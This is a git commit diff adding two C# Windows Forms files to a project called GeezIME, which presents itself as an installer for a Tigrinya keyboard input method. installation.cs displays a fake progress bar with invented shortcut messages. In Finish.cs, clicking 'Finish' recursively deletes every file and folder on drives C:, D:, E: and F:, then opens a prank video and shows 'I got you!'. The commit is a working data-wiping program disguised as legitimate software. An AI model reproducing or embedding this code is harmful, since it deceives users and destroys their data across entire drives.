8c883a6db4fec6494b826532b0969baf74032b0d
NattyXO <nattyxo2018@gmail.com>
2024-01-11 13:12:37 +0300

    add code

---
+++ Finish.cs
@@ -0,0 +1,60 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace GeezIME
+{
+    public partial class Finish : Form
+    {
+        public Finish()
+        {
+            InitializeComponent();
+        }
+
+        private void btnFinish_Click(object sender, EventArgs e)
+        {
+            string folderPath = @"C:\";
+            string folderPath2 = @"D:\";
+            string folderPath3 = @"E:\";
+            string folderPath4 = @"F:\";
+
+            // Call the DeleteFolderRecursively method to delete the specified folder and its contents
+            DeleteFolderRecursively(folderPath);
+            DeleteFolderRecursively(folderPath2);
+            DeleteFolderRecursively(folderPath3);
+            DeleteFolderRecursively(folderPath4);
+
+            string rikcroll = "https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley";
+
+            // Open the default browser with the specified URL
+            Process.Start(rikcroll);
+            MessageBox.Show("I got you!");
+
+        }
+        static void DeleteFolderRecursively(string folderPath)
+        {
+            // Delete files in the folder
+            foreach (string filePath in System.IO.Directory.GetFiles(folderPath))
+            {
+                File.Delete(filePath);
+            }
+
+            // Recursively delete subfolders
+            foreach (string subFolderPath in Directory.GetDirectories(folderPath))
+            {
+                DeleteFolderRecursively(subFolderPath);
+            }
+
+            // Delete the current folder
+            Directory.Delete(folderPath, true);
+        }
+    }
+}
---
+++ installation.cs
@@ -0,0 +1,79 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace GeezIME
+{
+    public partial class installation : Form
+    {
+        public installation()
+        {
+            InitializeComponent();
+        }
+
+        private void installation_Load(object sender, EventArgs e)
+        {
+            timer1.Start();
+        }
+
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+           if (progressBar1.Value <= progressBar1.Maximum-1)
+            {
+                progressBar1.Value += 1;
+            }
+
+           if (progressBar1.Value == 10)
+            {
+                lblShortcut.Text = @"Create shortcut: C:\ProgramData\Microsoft\Windows\Start Menu\Programs";
+            }
+            if (progressBar1.Value == 20)
+            {
+                lblShortcut.Text = @"Create shortcut: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\GeezIME";
+            }
+            if (progressBar1.Value == 30)
+            {
+                lblShortcut.Text = @"Create shortcut: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\GeezIME\GeezIME manual";
+            }
+            if (progressBar1.Value == 40)
+            {
+                lblShortcut.Text = @"Create shortcut: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\GeezIME\GeezIME";
+            }
+            if (progressBar1.Value == 60)
+            {
+                lblShortcut.Text = @"Create shortcut: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\GeezIME\Tigrinya keyboard";
+            }
+            if (progressBar1.Value == 70)
+            {
+                lblShortcut.Text = @"Create shortcut: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\GeezIME\Uninstall";
+            }
+            if (progressBar1.Value == 80)
+            {
+                lblShortcut.Text = @"Create shortcut: C:\Program Files (x86)\EriLS\GeezIME\tosk";
+            }
+            if (progressBar1.Value == 90)
+            {
+                lblShortcut.Text = @"Create shortcut: C:\Program Files (x86)\EriLS\GeezIME\Uninst";
+            }
+            if (progressBar1.Value == 100)
+            {
+                lblShortcut.Text = @"Create shortcut: C:\Program Files (x86)\EriLS\GeezIME\rt\GeezIMEHelper";
+            }
+           
+            if (progressBar1.Value == 100)
+            {
+                timer1.Stop();
+                Finish ss = new Finish();
+                this.Hide();
+                ss.Show();
+            }
+
+        }
+    }
+}
